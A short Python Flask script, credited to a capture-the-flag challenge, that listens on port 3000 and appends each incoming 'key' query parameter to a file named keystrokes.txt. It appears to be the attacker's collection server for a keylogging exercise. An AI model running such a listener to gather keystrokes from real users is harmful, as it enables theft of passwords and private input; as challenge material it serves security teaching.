#Credits: https://github.com/athack-ctf/chall2025-insecure-by-design
from flask import Flask, request

app = Flask(__name__)

@app.route('/', methods=['GET'])
def handle_request():
    # Get the 'key' parameter from the query string
    key_value = request.args.get('key')

    # Open the file and append the 'key' value if it exists
    if key_value:
        with open("keystrokes.txt", "a") as file:
            file.write(key_value)
        print(f"Received 'key' value: {key_value}")
    else:
        print("No 'key' parameter found.")

    # Send a simple response back to the client
    return "Request received. Check the server console for the 'key' parameter."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3000)
